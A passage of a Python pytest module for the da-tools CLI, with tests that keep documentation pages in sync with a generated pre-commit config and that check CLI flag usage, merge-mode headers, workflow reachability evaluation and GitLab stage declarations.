        f"{_FENCE}yaml\nrepos:\n  - repo: local\n    hooks: []\n{_FENCE}\n"
    )
    assert _unmarked_precommit_blocks(marked_only) == []

    # The shape #1418 is about: a second pre-commit block, no marker on it.
    plus_unmarked = marked_only + (
        f"\nAnother example:\n\n{_FENCE}yaml\nrepos:\n  - repo: local\n"
        f"    hooks:\n      - id: x\n        language: system\n{_FENCE}\n"
    )
    assert len(_unmarked_precommit_blocks(plus_unmarked)) == 1, (
        "an unmarked pre-commit block was not reported, so the exhaustiveness "
        "rule is decorative: a page can ship a second, uncompared copy of the "
        "very artifact this section exists to keep honest."
    )

    # A fenced block that is not a pre-commit config is nobody's business here.
    assert _unmarked_precommit_blocks(
        marked_only + f"\n{_FENCE}yaml\nsomething: else\n{_FENCE}\n"
    ) == []


def test_markdown_code_spans_excludes_prose() -> None:
    """The false positive this helper exists for, as a fixture rather than luck.

    ⛔ Before this case, the only input in the whole repo that distinguished
    "split by Markdown structure" from "scan the raw page" was one English
    sentence in a link description on one of the two real pages. Rewording that
    link would have silently retired the helper's reason to exist.
    """
    spans = _markdown_code_spans(_SYNTHETIC_PAGE)
    joined = "\n".join(spans)
    assert "da-tools validate-config --config-dir conf.d/" in joined, (
        "inline code spans are not being collected"
    )
    assert "id: h" in joined, "fenced blocks are not being collected"
    assert "in passing" not in joined, (
        "prose leaked into the scanned set — `da-tools commands` in a sentence "
        "is not an invocation, and treating it as one is what got a repo-wide "
        "version of this check rejected."
    )


def test_da_tools_flag_check_rejects_what_argparse_would() -> None:
    """⛔ The only input that tells this check apart from `return []`.

    The real pages are clean, by construction — that is the point of the fix.
    So every assertion against them passes for a stub too, and a blind review
    proved it: emptying the flag regex, disabling the continuation fold, and
    `assert … or True` all survived against the real pages.
    """
    declared = {"validate-config": {"--config-dir", "--json"}}

    clean = "`da-tools validate-config --config-dir conf.d/ --json`\n"
    assert _undeclared_da_tools_usage(clean, declared) == []

    bogus = "`da-tools validate-config --config-dir conf.d/ --ci`\n"
    assert _undeclared_da_tools_usage(bogus, declared) == [
        "da-tools validate-config --ci"
    ]

    unknown = "`da-tools no-such-command --config-dir conf.d/`\n"
    assert _undeclared_da_tools_usage(unknown, declared) == [
        "da-tools no-such-command (no such subcommand)"
    ]

    # The continuation fold is load-bearing: without it the flags of a wrapped
    # command are invisible, which is the half that was wrong for two releases.
    wrapped = (
        f"{_FENCE}bash\nda-tools validate-config \\\n"
        f"  --config-dir conf.d/ \\\n  --ci\n{_FENCE}\n"
    )
    assert _undeclared_da_tools_usage(wrapped, declared) == [
        "da-tools validate-config --ci"
    ], "line-continuations are not being folded before the flags are read"

    # …and it must not reach across a real newline into the next command.
    two_commands = (
        f"{_FENCE}bash\nda-tools validate-config --config-dir conf.d/\n"
        f"da-tools validate-config --json\n{_FENCE}\n"
    )
    assert _undeclared_da_tools_usage(two_commands, declared) == []

    # Prose must not be scanned, even when it names a subcommand.
    assert _undeclared_da_tools_usage("See all da-tools commands here.\n", declared) == []


def test_normalised_precommit_keeps_what_the_comparison_needs() -> None:
    """⛔ The control for a filter that is applied to both sides of an equation.

    Any information this drops is dropped symmetrically, so the equation it
    feeds cannot notice. Measured: replacing the body with a constant left the
    whole file green, and so did re-adding the six-key projection this function
    was written to remove. The ``must_differ`` table below holds the differences
    that MUST survive normalisation; the single assertion after the loop holds
    the one difference it is allowed to absorb.
    """
    base = {
        "repos": [{
            "repo": "local",
            "hooks": [{
                "id": "h", "name": "n", "language": "docker_image",
                "entry": "img run --flag", "files": "^conf\\.d/",
                "pass_filenames": False,
            }],
        }],
    }

    def _mutate(**over):
        import copy
        out = copy.deepcopy(base)
        hook = out["repos"][0]["hooks"][0]
        for key, value in over.items():
            if key == "repo":
                out["repos"][0]["repo"] = value
            elif value is None:
                hook.pop(key, None)
            else:
                hook[key] = value
        return out

    must_differ = {
        "repo (a `repo: meta` config is one pre-commit refuses to load)":
            _mutate(repo="meta"),
        "language (docker_image vs system decides how entry is exec'd)":
            _mutate(language="system"),
        "entry (the argv the customer's machine runs)":
            _mutate(entry="img run --other"),
        "files (when the hook fires)": _mutate(files="^other/"),
        "pass_filenames (whether argv gets paths appended)":
            _mutate(pass_filenames=True),
        "id": _mutate(id="other"),
        "an added key nobody enumerated (stages:)":
            _mutate(stages=["manual"]),
        "a removed key": _mutate(name=None),
    }
    for why, mutated in must_differ.items():
        assert _normalised_precommit(mutated) != _normalised_precommit(base), (
            f"normalisation erased a difference in {why}. Every such erasure "
            "silently weakens the doc-vs-artifact comparison, because it is "
            "applied to both sides."
        )

    # …and the one difference it must absorb: a folded scalar's line wrapping.
    wrapped = _mutate(entry="img\nrun\n--flag")
    assert _normalised_precommit(wrapped) == _normalised_precommit(base), (
        "line-wrapping inside a `>-` scalar is each side's formatting choice; "
        "treating it as contractual would make the page unable to wrap at all."
    )


def test_mirror_page_list_covers_every_page_that_declares_a_mirror() -> None:
    """⛔ Anti-vacuity for the hard-coded page list itself.

    Every assertion in this section is parametrised over ``_MIRROR_DOC_PAGES``,
    so the list is the quantifier: shrink it and the tests still pass, having
    checked less. Measured — deleting the ``.en.md`` entry took the section
    quietly running fewer tests at rc=0, and emptying it entirely left one test
    passing and ten skipped, which is the skip-as-green shape this repo has
    been burned by before.

    The floor cannot be a number (a number goes stale the moment a third page
    mirrors something) and it must not be derived from the list it protects.
    So it is derived from the pages themselves: a page that declares a mirror
    IS a page this section must cover, and the marker is that declaration.
    """
    discovered = {
        path.relative_to(_REPO_ROOT).as_posix()
        for path in (_REPO_ROOT / "docs").rglob("*.md")
        if _MIRROR_MARKER.search(_prose_outside_fences(
            path.read_text(encoding="utf-8", errors="replace")))
    }
    assert discovered, (
        "no page under docs/ carries a `<!-- mirrors-artifact: … -->` marker. "
        "Either the marker convention was removed — in which case remove this "
        "whole section in the same commit rather than leaving it quantifying "
        "over nothing — or the pages moved out of docs/."
    )
    assert discovered == set(_MIRROR_DOC_PAGES), (
        "the pages that declare a mirror and the pages this section checks "
        "have diverged.\n"
        f"  declares a mirror but unchecked: {sorted(discovered - set(_MIRROR_DOC_PAGES))}\n"
        f"  checked but declares nothing:    {sorted(set(_MIRROR_DOC_PAGES) - discovered)}\n"
        "⛔ Dropping an entry from _MIRROR_DOC_PAGES is not how you silence "
        "this: the page goes on shipping a copy of an artifact, just without "
        "anything comparing them. Add the page here, or remove its marker AND "
        "its mirrored block together."
    )


_MERGE_MODE = re.compile(r"merge-mode:\s*(?P<mode>[a-z-]+)")


def _derived_merge_mode(artifact_text: str) -> str:
    """What a reader can safely DO with this artifact, derived from its shape.

    ⛔ Not read from the file's own claim. A YAML document whose top level is a
    mapping cannot be appended to another config: the reader ends up with the
    key twice and every loader in this stack keeps only the last one, silently.
    So the answer is a function of the artifact, and the artifact's own header
    has to agree with it rather than assert it.
    """
    return "merge-items" if isinstance(
        yaml.safe_load(artifact_text), dict) else "append-whole"


def _shipped_hook_ids() -> set[str]:
    """The hook ids `da-tools init` actually writes — read off the generator.

    The discriminator between "a copy of our artifact" and "a pre-commit
    example", derived rather than typed, so adding a third hook to the
    generator extends the check with it.
    """
    cfg = yaml.safe_load(ip._gen_precommit_snippet("img:tag"))
    ids = {h["id"] for r in cfg["repos"] for h in r["hooks"]}
    assert ids, "the generated artifact declares no hook ids to key on"
    return ids


def _names_our_hooks(text: str, start: int, ours: set[str]) -> bool:
    hit = _fence_after(text, start - 1)
    if hit is None:
        return False
    return any(hook_id in hit[1] for hook_id in ours)


def _prose_outside_fences(text: str) -> str:
    """The page with fenced blocks blanked out, offsets preserved.

    ⛔ A marker shown INSIDE a code fence is being displayed, not declared.
    Without this, documenting the `<!-- mirrors-artifact: … -->` convention —
    which dev-rule #4 Doc-as-Code asks for — registers the documenting page as
    a mirror page, and the only way back to green is to not write the
    documentation. Measured by a blind review on `testing-playbook.md`.

    ⛔ INLINE code spans count too, and leaving them out shipped a false red
    that only appears on Linux. `docs/CHANGELOG.md` is a symlink to the root
    `CHANGELOG.md`; on a Windows checkout with `core.symlinks` off it is a
    15-byte file holding the link text, so the scan read nothing and passed,
    while CI resolved it and read the whole changelog — which describes this
    very convention and therefore contains a literal ``<!-- mirrors-artifact:
    … -->`` inside backticks. The page was reported as declaring a mirror.
    Documenting a marker must not be the same act as using one, in prose
    exactly as in a fenced block.

    ⛔ Line-based on purpose. The first version reused `_fence_after`, whose
    `start` is the OPENING FENCE line and whose `body` excludes both fence
    lines — so `start + len(body) + 1` is not the end of the block, the
    blanked ranges overlapped, and 78% of a real page was erased along with
    the markers this is meant to preserve. Measured: `discovered` went to the
    empty set.
    """
    kept: list[str] = []
    inside = False
    for line in text.splitlines(keepends=True):
        if line.lstrip().startswith("```"):
            inside = not inside
            kept.append("\n" if line.endswith("\n") else "")
            continue
        if inside:
            kept.append("\n" if line.endswith("\n") else "")
            continue
        kept.append(re.sub(r"`[^`\n]*`", lambda m: " " * len(m.group()), line))
    return "".join(kept)


def _tracked_markdown() -> list[str]:
    """Every tracked `.md`, asked of git rather than globbed.

    `rglob` from the repo root would walk `node_modules/`, `.venv/` and every
    other ignored tree; scoping it to `docs/` instead is how the first version
    of the caller came to be narrower than its own docstring.
    """
    out = subprocess.run(
        ["git", "ls-files", "-z", "*.md"],
        cwd=_REPO_ROOT, capture_output=True, text=True, check=False,
        stdin=subprocess.DEVNULL, timeout=120,
    )
    pages = [p for p in out.stdout.split("\0") if p]
    assert out.returncode == 0 and pages, (
        f"`git ls-files -z '*.md'` yielded {len(pages)} path(s) "
        f"(rc={out.returncode}). The caller's quantifier comes from here, so "
        "an empty answer would silently check nothing."
    )
    return sorted(pages)


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_the_artifact_and_the_pages_agree_on_how_to_merge_it(
    generated, ci, deploy,
) -> None:
    """⛔ The defect this PR is named after had NO guard until this test.

    `.pre-commit-config.da.yaml` used to open with `# Add this to your existing
    .pre-commit-config.yaml`, and a reader who did exactly that got a second
    top-level `repos:` key. Measured with pre-commit's own loader and its own
    `validate-config`: rc=0, no warning, and every hook the customer already
    had is gone — output byte-identical to a healthy config. The CLI's
    next-steps line and both doc pages carried the same instruction.

    ⛔ It was fixed with nothing pinning it. Counterfactual, run by a blind
    review: reverting all three carriers to the previous commit while keeping
    every test left the suite green and four doc lints at rc=0. The reason is
    structural and worth stating, because it applies to any future assertion
    here — the mirror comparison runs `yaml.safe_load` on both sides, and just
    over half of this artifact's lines are comments, so the entire half a
    customer reads first is outside it.

    Hence a marker, in the file and on the pages, whose VALUE is derived from
    the artifact rather than declared by it.
    """
    root = generated[(ci, deploy)]
    artifact = (root / _PRECOMMIT_ARTIFACT).read_text(encoding="utf-8")
    expected = _derived_merge_mode(artifact)

    found = _MERGE_MODE.search(artifact)
    assert found and found.group("mode") == expected, (
        f"{_PRECOMMIT_ARTIFACT} declares merge-mode "
        f"{found.group('mode') if found else None!r}, derived value is "
        f"{expected!r}. This file's top level is a mapping, so appending it "
        "whole to an existing config silently drops that config's hooks — the "
        "header has to say so, and this line is what stops the instruction "
        "from quietly reverting."
    )

    for page in _MIRROR_DOC_PAGES:
        text = (_REPO_ROOT / page).read_text(encoding="utf-8")
        declared = _MIRROR_MARKER.search(_prose_outside_fences(text))
        if not declared or declared.group("path") != _PRECOMMIT_ARTIFACT:
            # ⛔ Scoped to pages mirroring THIS artifact. The module's own note
            # on `_PRECOMMIT_ARTIFACT` says other artifacts may be mirrored
            # with the same marker and "must not be dragged through assertions
            # about hook entries"; the first version of this loop required a
            # merge-mode on every listed page, so a page mirroring, say, a
            # `_defaults.yaml` sample reddened with a message that told it it
            # needed `merge-items` — advice that was false for that artifact.
            continue
        on_page = _MERGE_MODE.search(text)
        assert on_page and on_page.group("mode") == expected, (
            f"{page} declares merge-mode "
            f"{on_page.group('mode') if on_page else None!r}, but the artifact "
            f"it mirrors needs {expected!r}. The page shows this block under a "
            '"merge into your config" heading; if the two disagree, one of '
            "them is teaching the destructive action."
        )


def test_appending_the_artifact_whole_really_does_lose_the_customers_hooks() -> None:
    """⛔ The control that keeps the marker above from being decoration.

    `merge-items` is only the right answer while wholesale appending is
    actually destructive. This runs that action against pre-commit's own
    loader, so the warning cannot outlive the hazard it describes — and so a
    reader of the test can see why the instruction is worded the way it is
    without taking anyone's word for it.
    """
    artifact = ip._gen_precommit_snippet("ghcr.io/vencil/da-tools:latest")
    existing = (
        "repos:\n"
        "  - repo: https://github.com/pre-commit/pre-commit-hooks\n"
        "    rev: v5.0.0\n"
        "    hooks:\n"
        "      - id: end-of-file-fixer\n"
        "      - id: trailing-whitespace\n"
    )
    mine = {"end-of-file-fixer", "trailing-whitespace"}

    naive = yaml.safe_load(existing + artifact)
    kept = {h["id"] for r in naive["repos"] for h in r["hooks"]}
    assert not (mine & kept), (
        "appending the artifact whole no longer drops the reader's hooks "
        f"(kept {sorted(kept)}). If that is genuinely fixed — the artifact "
        "became a fragment, or the loader started rejecting duplicate keys — "
        "then `_derived_merge_mode` and the header should change together, "
        "and this test should be the thing that made you look."
    )

    item = artifact[artifact.index("  - repo: local"):]
    merged = yaml.safe_load(existing + item)
    kept = {h["id"] for r in merged["repos"] for h in r["hooks"]}
    assert mine <= kept and {"da-validate-config", "da-generate-routes"} <= kept, (
        f"following the header's instruction yielded {sorted(kept)}. The "
        "positive half matters as much as the negative one: an instruction "
        "that is safe because it does nothing is not an instruction."
    )


def test_no_page_outside_the_list_ships_an_unchecked_precommit_block() -> None:
    """⛔ The other end of the same rule, and the one the list cannot reach.

    The test above derives the page list from pages that DECLARE a mirror, so a
    new page carrying a marker is picked up automatically. A new page carrying
    a broken pre-commit block and NO marker is not — it is outside every
    quantifier here, which is exactly the state `docs/scenarios/…` was in when
    #1418 shipped. So this asks the opposite question of the whole tree: does
    any page have a top-level `repos:` block that nothing is comparing?

    ⛔ Every TRACKED `.md`, not `docs/**`. A blind review pasted the pre-#1418
    broken snippet into `components/da-tools/README.md` — outside `docs/` — and
    this whole file stayed green, which is the same "the quantifier is narrower
    than the sentence describing it" shape the guard exists to catch. The tree
    has markdown outside `docs/` and nothing says a customer-facing snippet
    cannot land there.

    Measured on this tree: exactly 2 pages carry such a block and both are
    already listed, so this starts at zero false reds rather than at a backlog
    of exemptions. The substring pre-filter exists because parsing fences on
    every tracked page is an order of magnitude slower than parsing the handful
    that mention the key at all — no figure is quoted here on purpose, because
    the last two figures written into this file both expired inside a day.

    ⛔ The pre-filter matches `repos` WITHOUT the colon, and an earlier version
    with the colon was measured unsound while claiming in this very docstring
    to be sound: `"repos":`, `'repos':` and `repos :` are all valid YAML that
    `_unmarked_precommit_blocks` treats as a pre-commit block, and none of them
    contains `repos:`. Quoting the key was enough to walk past the guard.
    """
    ours = _shipped_hook_ids()
    stragglers = {}
    for page in _tracked_markdown():
        if page in _MIRROR_DOC_PAGES:
            continue
        text = (_REPO_ROOT / page).read_text(encoding="utf-8", errors="replace")
        if "repos" not in text:
            continue
        copies = [
            start for start in _unmarked_precommit_blocks(text)
            if _names_our_hooks(text, start, ours)
        ]
        if copies:
            stragglers[page] = len(copies)

    assert not stragglers, (
        f"{stragglers} ship an unchecked copy of OUR pre-commit hooks "
        f"({sorted(ours)}) — nothing compares them to the artifact. ⛔ #1418 "
        "was exactly this: a hand-copied block that had drifted three ways "
        "from the artifact it claimed to show, on a page the customer is "
        "pointed at four times from the CLI. Add a "
        "`<!-- mirrors-artifact: <path> -->` marker naming the file it mirrors "
        "and add the page to _MIRROR_DOC_PAGES, or delete the block.\n"
        "⛔ A block that does NOT name our hook ids is not this — a generic "
        "`repos:` example in a contributor doc has no shipped artifact to be "
        "compared against, and an earlier version of this check reported it "
        "anyway. Following that message's advice then produced twenty new "
        "failures, because the page had no artifact to point a marker at."
    )


@pytest.mark.parametrize("page", _MIRROR_DOC_PAGES)
def test_every_precommit_block_on_the_page_is_marked(page) -> None:
    """⛔ Exhaustiveness. The marker says WHICH artifact; this says NO block escapes.

    Without this, the marker is opt-in: a second pre-commit block that simply
    carries no marker is not compared against anything. Measured on this very
    page — pasting the pre-#1418 broken snippet back as an unmarked second
    example left the guard green and all four doc lints at rc=0.
    """
    text = (_REPO_ROOT / page).read_text(encoding="utf-8")
    blocks = set(_precommit_fences(text))

    assert blocks, (
        f"{page} contains no pre-commit config block at all. This page exists "
        "to show the customer what to merge; if that genuinely moved, move "
        "this page out of _MIRROR_DOC_PAGES in the same commit."
    )
    unmarked = _unmarked_precommit_blocks(text)
    assert not unmarked, (
        f"{page} has {len(unmarked)} pre-commit block(s) with no "
        "`<!-- mirrors-artifact: <path> -->` marker above them, so nothing "
        "compares them to anything that ships. ⛔ Removing the marker from the "
        "others is not the fix. If a block is illustrative rather than "
        "mirrored, it still has to say so — mark it with the artifact it "
        "corresponds to, or delete it."
    )


@pytest.mark.parametrize("page", _MIRROR_DOC_PAGES)
@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_docs_mirrored_block_matches_the_shipped_artifact(
    generated, ci, deploy, page
) -> None:
    """⛔ A page that shows an artifact must show the artifact that ships.

    `init_project.py` names this page in four places: the ``# Docs:`` header of
    each generated workflow, and once in each language branch of the "next
    steps" the CLI prints. §4 of it hand-copied a pre-commit hook, and when the
    generator's copy was fixed (#1347, #1390) the page stayed put: it went on
    teaching `language: system` + a literal ``${PWD}`` mount + a ``--ci`` flag
    `validate-config` does not accept. Every one of those is a 100% failure for
    a customer who copies it, and NOTHING was watching — the sibling guards in
    this file read the artifact only, and the verify_diff entry for this page is
    a test SELECTOR, not an assertion.

    Both sides are read from artifacts: the page as committed, and the file
    ``run_init`` really wrote. The per-combination parametrisation additionally
    pins that the mirrored file is ``--ci``/``--deploy`` independent.
    """
    root = generated[(ci, deploy)]
    doc = _REPO_ROOT / page
    assert doc.is_file(), (
        f"{page} is missing. It is one of the pages the generated workflows "
        "link to in their `# Docs:` header — if it moved, move this constant "
        "with it; do not drop the entry."
    )
    text = doc.read_text(encoding="utf-8")

    marked = _marked_fences(text)
    assert marked, (
        f"{page} carries no `<!-- mirrors-artifact: <path> -->` marker, so "
        "nothing on it is being compared against what `da-tools init` writes. "
        "This page previously hand-copied an artifact and drifted for two "
        "releases without a single test noticing."
    )

    for start, rel in marked.items():
        artifact = root / rel
        assert artifact.is_file(), (
            f"{page} claims to mirror {rel!r}, but "
            f"`da-tools init --ci {ci} --deploy {deploy}` writes no such file. "
            "Either the marker names the wrong path, or the page is showing a "
            "customer something that no longer ships."
        )
        hit = _fence_after(text, start)
        assert hit is not None and hit[1].strip(), (
            f"{page}: the `mirrors-artifact: {rel}` marker is not followed by "
            "a complete fenced block. The marker is the declaration; a marker "
            "with nothing under it compares nothing."
        )

        doc_cfg = _normalised_precommit(yaml.safe_load(hit[1]))
        art_cfg = _normalised_precommit(
            yaml.safe_load(artifact.read_text(encoding="utf-8"))
        )
        assert doc_cfg, (
            f"{page} shows an empty block under `mirrors-artifact: {rel}` — "
            "that is nothing a customer can copy, and it would make the "
            "comparison below vacuously true."
        )
        assert doc_cfg == art_cfg, (
            f"{page} no longer matches the {rel} that "
            f"`da-tools init --ci {ci} --deploy {deploy}` writes.\n"
            f"  page:     {doc_cfg}\n"
            f"  artifact: {art_cfg}\n"
            "The ARTIFACT is the source of truth: it is what the customer's "
            "machine will actually run, and its argv is separately derived "
            "against the real CLI by "
            "test_generated_precommit_hooks_can_actually_run (a static "
            "derivation, not an execution). If the generator changed on "
            "purpose, update the block on the page — in every language. If the "
            "page is right and the generator regressed, fix "
            "`_gen_precommit_snippet` in scripts/tools/ops/init_project.py. "
            "⛔ Do not relax this comparison to make the two 'close enough' — "
            "the defect it exists for was exactly a page that looked close "
            "enough."
        )


def test_docs_mirrored_block_pins_the_cli_default_image() -> None:
    """⛔ The mirrored image tag must be the CLI's default, not the fixture's.

    The comparison above reads both sides from artifacts, with one exception it
    could not see: the artifact is produced by a fixture that passes
    ``da_tools_image`` in explicitly, and every test in this repo passes the
    same literal. Two of the ten argv tokens across the two hooks — the first
    of each — were therefore supplied by the test suite rather than derived.
    Measured by flipping ``DA_TOOLS_IMAGE`` to another tag, which left 386
    tests passing across `tests/ops` while a default `da-tools init` started
    writing an image the page does not mention.

    Scoped to the pre-commit artifact on purpose: the marker is generic, and a
    page mirroring some other artifact (a `_defaults.yaml` sample, say) has no
    hook entries to check. Asserting on every marker made such a page red with
    a message that explained none of it.
    """
    parser = ip._build_parser()
    defaults = [a.default for a in parser._actions if a.dest == "da_tools_image"]
    assert defaults, "the init parser no longer declares --da-tools-image"
    default_image = defaults[0]

    checked = 0
    for page in _MIRROR_DOC_PAGES:
        text = (_REPO_ROOT / page).read_text(encoding="utf-8")
        for start, rel in _marked_fences(text).items():
            if rel != _PRECOMMIT_ARTIFACT:
                continue
            hit = _fence_after(text, start)
            assert hit is not None, f"{page}: marked block has no fence"
            cfg = yaml.safe_load(hit[1]) or {}
            entries = [
                str(hook.get("entry", ""))
                for repo in cfg.get("repos") or []
                for hook in repo.get("hooks") or []
            ]
            assert len(entries) >= 2, (
                f"{page} mirrors {rel} with {len(entries)} hook(s). The shipped "
                "file has two, and the page teaching only one of them is the "
                "exact omission #1418 found."
            )
            images = {entry.split()[0] for entry in entries if entry.split()}
            assert images == {default_image}, (
                f"{page} shows the image(s) {sorted(images)}, but a default "
                f"`da-tools init` writes {default_image!r}. The page documents "
                "the default invocation, so it has to track the default. ⛔ Do "
                "not pin the page to a released tag to make this pass — that "
                "is the drift, not the fix."
            )
            checked += 1

    assert checked == len(_MIRROR_DOC_PAGES), (
        f"only {checked} of {len(_MIRROR_DOC_PAGES)} page(s) carried a "
        f"`mirrors-artifact: {_PRECOMMIT_ARTIFACT}` marker. Every assertion "
        "above lives inside that loop, so a page that loses its marker makes "
        "this test pass by checking nothing."
    )


@pytest.mark.parametrize("page", _MIRROR_DOC_PAGES)
def test_docs_da_tools_invocations_use_flags_the_cli_declares(page) -> None:
    """⛔ Every `da-tools` flag on these pages must exist, or copying it exits 2.

    This page taught ``validate-config --ci`` and ``--verbose`` for two
    releases. Neither flag exists; both exit 2 at argparse before a single
    check runs, so the "diagnose your failure" row of the troubleshooting table
    was itself a failure.

    ⛔ Scope is these pages, not docs/ at large. `check_doc_datools_cmds.py`
    documents why the repo-wide version was prototyped and rejected (~88 false
    positives from scenario docs using illustrative pseudo-commands); the two
    pages here were checked command by command and contain none, which is what
    makes an exact-match assertion affordable at all. Widening it is #1379's
    job, not this guard's.
    """
    declared = _da_tools_subcommands()
    text = (_REPO_ROOT / page).read_text(encoding="utf-8")

    problems = _undeclared_da_tools_usage(text, declared)
    assert not problems, (
        f"{page} documents {len(problems)} `da-tools` invocation(s) the CLI "
        f"would reject: {problems}. A reader who copies any of them gets exit "
        "2 from argparse before any check runs."
    )

    # Anti-vacuity, on the quantity that moves when the extractor breaks: the
    # subcommand count alone stayed at 19 with the whole flag half disabled.
    invocations = _da_tools_invocations(text)
    flags_seen = sum(len(flags) for _, flags in invocations)
    assert len(invocations) >= 6 and flags_seen >= 10, (
        f"{page} yielded {len(invocations)} invocation(s) and {flags_seen} "
        "flag(s) inside code spans. Measured at the time of writing: 19 and 25 "
        "on each page. A drop this large means the extractor broke, not that "
        "the page got shorter. ⛔ Lowering these numbers is not the fix."
    )


def test_the_unsupported_if_corpus_is_not_empty() -> None:
    """⛔ Anti-vacuity floor for the corpus that guards the guard.

    An empty `parametrize` is a SKIP and exits 0. This corpus protects the
    evaluator's ONLY safety property — its refusal to grade an `if:` it cannot
    read — so a silent emptying removes the protection without a red run.
    Measured: emptying this list and the parity file's `_BYPASSES` gave
    81 passed / 2 skipped / exit 0. The file already argues this hazard for the
    CLI matrix; the axes guarding the guards needed the same floor.
    """
    assert len(_UNSUPPORTED_IFS) >= 6, (
        f"only {len(_UNSUPPORTED_IFS)} unsupported-`if:` shapes remain — this "
        "corpus is what proves the evaluator fails closed. Do not shrink it to "
        "make a change pass."
    )


@pytest.mark.parametrize("if_expr", _UNSUPPORTED_IFS)
def test_reachability_evaluator_refuses_shapes_it_cannot_read(if_expr) -> None:
    """Fail-CLOSED: an unreadable `if:` raises instead of assuming reachable.

    Assuming reachable is how #1356 hides — the job looks fine and never runs.
    Extending the evaluator is the correct response to a new shape; relaxing it
    is not, and this test is what makes that a decision rather than an edit.
    """
    with pytest.raises(_UnsupportedIf):
        _assert_job_event_reachability(
            _synthetic(if_expr), "synthetic", {"gate": set(), "subject": set()})


def test_the_dead_knob_detector_actually_detects() -> None:
    """⛔ Counter-examples for `_unwired_knobs`, which had none.

    It is the sole detector behind two assertions, and on the real artifacts one
    of them is vacuous: the generated `workflow_dispatch:` declares no inputs at
    all, so that call reduces to `assert not []` on all nine combinations.
    Measured: inserting `return []` at the top of `_unwired_knobs` left
    151 passed / 6 skipped — byte-identical to baseline, zero tests died.

    That is the shape this file already fixed for the reachability evaluator
    (three meta-tests at the `_synthetic` helper above) and for the shell-comment
    stripper. The detector for the #1361 class had been left as the one piece of
    machinery nothing points at.

    Both hops are covered, plus a paired positive so a future tightening cannot
    drift into biting correct wiring.
    """
    dead_input = {
        "on": {"workflow_dispatch": {"inputs": {"dry_run": {"type": "boolean"}}}},
        "env": {"DRY_RUN": "${{ inputs.dry_run }}"},
        "jobs": {"a": {"steps": [{"run": "echo hello"}]}},
    }
    assert "inputs.dry_run" in " ".join(_unwired_knobs(dead_input)), (
        "an input bound only to an env var nobody reads must be reported — "
        "that binding is hop one of two, and treating it as wiring is exactly "
        "the false negative this detector was rewritten to close (#1361)."
    )

    dead_env = {
        "on": {"workflow_dispatch": None},
        "env": {"MONITORING_NS": "monitoring"},
        "jobs": {"a": {"steps": [{"run": "kubectl get pods"}]}},
    }
    assert "MONITORING_NS" in " ".join(_unwired_knobs(dead_env)), (
        "a declared `env:` name that no executable position reads must be "
        "reported; this is the knob the customer edits expecting an effect."
    )

    # Paired positive: correct wiring must NOT be reported, or the detector
    # drifts into flagging every artifact and gets silenced.
    wired = {
        "on": {"workflow_dispatch": {"inputs": {"dry_run": {"type": "boolean"}}}},
        "env": {"DRY_RUN": "${{ inputs.dry_run }}"},
        "jobs": {"a": {"steps": [{"run": "test \"$DRY_RUN\" = true && echo skip"}]}},
    }
    assert not _unwired_knobs(wired), (
        f"correctly wired knobs were reported as dead: {_unwired_knobs(wired)}"
    )


def test_reachability_evaluator_reads_the_shapes_it_claims_to() -> None:
    """The paired positive: supported shapes must NOT be refused or misread.

    Without this the previous test is satisfiable by refusing everything, which
    would make the guard bite every workflow and stop being read.
    """
    _assert_job_event_reachability(
        _synthetic("github.event_name == 'workflow_dispatch'"), "synthetic-ok",
        {"gate": {"pull_request"}, "subject": {"workflow_dispatch"}})
    # No `if:` at all == runs on every event.
    _assert_job_event_reachability(
        _synthetic(None), "synthetic-nogate",
        {"gate": {"pull_request"}, "subject": {"pull_request", "workflow_dispatch"}})


def test_reachability_evaluator_propagates_skips_through_needs() -> None:
    """#1356 in miniature, on synthetic input: a skipped dep skips its dependant."""
    dead = _synthetic("github.event_name == 'workflow_dispatch'", needs=["gate"])
    with pytest.raises(AssertionError, match="can NEVER run"):
        _assert_job_event_reachability(
            dead, "synthetic-dead", {"gate": {"pull_request"}, "subject": set()})


def test_reachability_evaluator_flags_a_widened_gate() -> None:
    """The other direction: MORE events than the contract is also a failure."""
    with pytest.raises(AssertionError, match="runs on changed"):
        _assert_job_event_reachability(
            _synthetic(None), "synthetic-wide",
            {"gate": {"pull_request"}, "subject": {"workflow_dispatch"}})


@pytest.mark.parametrize("ci,deploy", GL_COMBOS)
def test_gitlab_jobs_reference_declared_stages(generated, ci, deploy) -> None:
    """Every job's ``stage:`` must be declared in the top-level ``stages:``.

    This is the thin-wrapper part: the vendored GitLab schema validates the
    SHAPE of a job, so it accepts ``stage: typo`` happily — GitLab itself only
    rejects it at pipeline-creation time. Verified empirically: the schema does
    catch an illegal ``when`` enum and a wrong-typed ``variables``, but not an
    undeclared stage reference.
    """
    path = generated[(ci, deploy)] / _GL_PIPELINE
    pipeline = yaml.safe_load(path.read_text(encoding="utf-8"))

    stages = pipeline.get("stages")
    assert stages, f"no top-level `stages:` in the `--deploy {deploy}` pipeline"

    jobs = _gitlab_jobs(pipeline)
    # ⛔ EXACT, like `_EXPECTED_GH_JOBS`. A `>= 4` floor only catches jobs going
    # missing; it says nothing about jobs APPEARING, and the appearing direction
    # is the dangerous one here. Measured: adding an `apply-hotfix` job that
    # runs `kubectl apply` under a bare `rules: - when: manual` and declares no
    # `environment:` left the suite at 83 passed — invisible to the stage check
    # (it has a valid stage) and invisible to the deploy-trigger check below
    # (which selects on `environment:`, a key the new job simply omits).
    # Selecting on a marker the subject chooses for itself is the same failure
    # the actionlint classifier had; pinning the set removes the choice.
    assert set(jobs) == _EXPECTED_GL_JOBS, (
        f"GitLab job set is {sorted(jobs)}, expected {sorted(_EXPECTED_GL_JOBS)}.\n"
        "A NEW job is not automatically covered by the checks in this file — in "
        "particular a cluster-writing job that omits `environment:` is skipped "
        "by the deploy-trigger guard entirely. Add it here AND make sure the "
        "trigger guard actually grades it before you widen this set."
    )
    for name, body in jobs.items():
        assert "stage" in body, f"job {name!r} declares no stage"
        assert body["stage"] in stages, (
            f"job {name!r} runs in stage {body['stage']!r}, which is not in "
            f"{stages} — GitLab refuses to create the pipeline"
        )


_ENTRYPOINT = _REPO_ROOT / "components" / "da-tools" / "app" / "entrypoint.py"

# ⛔ Only what argparse itself provides to every parser. This set was previously
# `{--help, --version, --prometheus, --config-dir}`, sourced from
# docs/cli-reference.md:83 ("所有命令都支援以下全局選項") and citing that line as
# its authority. That sentence is FALSE, measured:
#   validate-config --config-dir <d> --prometheus http://x  -> rc=2
#   config-diff --old-dir <d> --new-dir <d> --config-dir <d> -> rc=2
